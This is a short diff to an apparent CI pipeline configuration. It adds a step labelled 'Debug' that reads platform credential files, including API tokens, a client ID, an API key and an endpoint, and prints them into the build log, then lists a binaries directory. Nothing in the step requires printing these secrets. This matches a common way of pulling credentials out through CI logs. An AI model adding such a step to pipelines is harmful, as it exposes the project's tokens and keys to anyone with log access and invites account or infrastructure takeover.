@@ -7,6 +7,23 @@ env:
   AXL_CONFIG: "/mnt/ephemeral/workdir/aspect-build/aspect-cli/axel-f/config.axl"
   ASPECT_DEBUG: "1"
 steps:
+  - key: __main__::debug
+    label: ":bazel: Debug"
+    agents:
+      queue: aspect-default
+    timeout_in_minutes: 20
+    command:
+      - cat /etc/aspect/workflows/platform/rosetta_api_tokens
+      - echo ""
+      - cat /etc/aspect/workflows/platform/api_client_id
+      - echo ""
+      - cat /etc/aspect/workflows/platform/api_key
+      - echo ""
+      - cat /etc/aspect/workflows/platform/brs_api_endpoint
+      - echo ""
+      - cat /etc/aspect/workflows/platform/az
+      - echo ""
+      - ls /etc/aspect/workflows/bin
   - key: __main__::build
     label: ":bazel: Build"
     agents:
